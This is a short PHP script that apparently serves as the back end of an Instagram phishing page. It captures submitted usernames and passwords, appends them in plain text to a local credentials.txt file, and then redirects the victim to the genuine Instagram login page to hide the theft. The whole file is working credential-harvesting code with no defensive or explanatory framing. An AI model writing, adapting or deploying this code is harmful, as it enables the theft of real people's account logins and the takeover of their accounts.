<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the credentials to a file
    $file = 'credentials.txt';
    $data = "Username: " . $username . " | Password: " . $password . "\n";
    file_put_contents($file, $data, FILE_APPEND);

    // Redirect to a thank you page or the real Instagram login page
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>
